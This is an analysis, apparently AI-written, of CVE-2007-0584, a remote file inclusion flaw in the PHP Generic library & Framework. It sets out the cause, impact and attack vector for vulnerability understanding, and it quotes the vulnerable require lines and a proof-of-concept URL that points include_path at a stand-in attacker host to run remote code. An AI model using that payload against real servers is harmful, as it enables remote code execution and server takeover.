Based on the provided information, here's an analysis of CVE-2007-0584:

**Root Cause of Vulnerability:**

The vulnerability stems from a flaw in how the PHP Generic library & Framework handles the `include_path` variable. It allows an attacker to control the `include_path` via a GET request parameter.

**Weaknesses/Vulnerabilities Present:**

*   **Remote File Inclusion (RFI):** The primary vulnerability is RFI. By manipulating the `include_path`, an attacker can force the application to include and execute malicious code from a remote server.

**Impact of Exploitation:**

*   **Arbitrary Code Execution:** Successful exploitation leads to arbitrary code execution on the server hosting the vulnerable application. This allows the attacker to gain complete control over the server, potentially leading to data theft, defacement, and other malicious activities.

**Attack Vectors:**

*   **HTTP GET Request Parameter:** The attack vector is through the `include_path` parameter within a HTTP GET request targeting a vulnerable script (`membreManager.php`).

**Required Attacker Capabilities/Position:**

*   **Network Access:** The attacker must be able to send HTTP requests to the vulnerable web server.
*   **Knowledge of Vulnerable Script:** The attacker needs to know the path to a vulnerable script, as well as the vulnerable GET parameter.
*   **Hosting of Malicious Script:** The attacker must have a web server to host the malicious PHP script to be included.

**Additional Details:**

*   The exploit details provided show the specific lines in the vulnerable code that are affected:
    ```php
    require $GLOBALS[include_path]."configmember.php";
    require $GLOBALS[include_path]."inc-membreManager.php";
    ```
*   The Proof of Concept (POC) provided in the exploit shows the vulnerable application and the crafted URL: `www.[target].com/[script_pat]/membres/membreManager.php?include_path=http://evilscripts?`

The exploit details provide more information compared to the typical CVE description which usually only indicates the existence of a vulnerability.
